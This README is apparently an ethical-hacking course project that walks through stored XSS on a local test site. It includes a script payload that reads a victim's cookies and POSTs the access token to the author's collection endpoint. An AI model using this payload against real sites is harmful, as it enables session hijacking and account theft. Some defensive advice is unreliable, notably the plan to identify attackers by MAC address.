# Script Injection and stealing Client Cookie
Ethical Hacking course project by @Sajjad-Hasan01, Dec-2023

## Introduction
These days, there are many ways to steal clients' information, one of them is _Cross-Site-Scripting (XSS)_ with _Database Inject_. In this project, I will present the easiest way to pass a script command and the basics to avoid these issues.

## Problem Statement
When a hacker can write any command in a regular input field and pass it as well, this is a very big issue, because the hacker can exploit this vulnerability in malicious ways. One of the malicious scenarios, inject a script that takes Cookies of the client from the browser window and sends them to his database.

The Cookies may contain _AccessToken_ of the client’s session, and this will take the hacker to open a client’s account. I will discuss the solution to this problem later.

This is a general problem. In this project, I implement the problem practically by using _Node.js_ as JavaScript runtime environment, _MongoDB_ as database, and _Postman_ as api for sending and receiving HTTP-Requests, all services are locally. Will see it in the next paragraph.

## Problem Test
Firstly, let’s signup and login to the local test website:
![1](https://github.com/Sajjad-Hasan01/eHack-XSS/blob/main/screenshots/1.jpg)
![2](https://github.com/Sajjad-Hasan01/eHack-XSS/blob/main/screenshots/2.jpg)
![3](https://github.com/Sajjad-Hasan01/eHack-XSS/blob/main/screenshots/3.jpg)
![4](https://github.com/Sajjad-Hasan01/eHack-XSS/blob/main/screenshots/4.jpg)

Now, I’ll try to exploit the Add Comment field to pass an injection:
![5](https://github.com/Sajjad-Hasan01/eHack-XSS/blob/main/screenshots/5.jpg)
![6](https://github.com/Sajjad-Hasan01/eHack-XSS/blob/main/screenshots/6.jpg)
![7](https://github.com/Sajjad-Hasan01/eHack-XSS/blob/main/screenshots/7.jpg)
![8](https://github.com/Sajjad-Hasan01/eHack-XSS/blob/main/screenshots/8.jpg)

As you can see in second and fourth images, the script works well and the browser shows the alerts.

If the client side catches the script and converts it to normal string or rejects it, there is another way to pass throw directly to API by using _Postman_. Now, I should get the Add-Comment API link:

From browser developer tools, I tried to get the request link from Network tap, but after every button click the page refresh itself.
![9](https://github.com/Sajjad-Hasan01/eHack-XSS/blob/main/screenshots/9.jpg)
![10](https://github.com/Sajjad-Hasan01/eHack-XSS/blob/main/screenshots/10.jpg)
![11](https://github.com/Sajjad-Hasan01/eHack-XSS/blob/main/screenshots/11.jpg)
The Add-Comment API link is `http://localhost:3000/api/addcomment` , and body of request is `comment`

In Postman, I sent a body contains a script that take Cookies from client’s browser window and sent it to a database collection: 
```javascript
<script>
    (() => {
        fetch('http://localhost:3000/api/xss',{
            method:'POST',
            headers: {
                "Content-Type": "application/json",
            },
            body: JSON.stringify({
                token: document.cookie
            })
        })
    })()
</script>
```

![12](https://github.com/Sajjad-Hasan01/eHack-XSS/blob/main/screenshots/13.jpg)
The response status was OK, and after refreshing the Home page, it displayed another empty comment which was my _Send-Cookie-Script_. Finally, I got the _Cookie_ that contains _AccessToken_ in my _Tokens_ collection of _eHackXss_ database:

![13](https://github.com/Sajjad-Hasan01/eHack-XSS/blob/main/screenshots/14.jpg)

## Problem Solution
To avoid NoSQL Injection, we have to use `mongoose` Node Package Modal (NPM) rather than `mongodb` and `Express-Mongo-Sanitize`, and `helmet` for secure HTTP Header, `XSS-Clean` for data sanitization against site script, `Yup` for input validation in the server. And the earliest versions of browsers have good ways to avoid scripts, now, it’s difficult to operate any script on a browser window.

Later, I will upgrade the project with implementation of an unusable _AccessToken_ which contains AccountID and MAC Address of the user's device. So, when the attacker gets the AccessToken and tries to use it, the server will receive the MAC Address of the attacker and extract the MAC Address of the legal user from _AccessToken_ then compare between them.
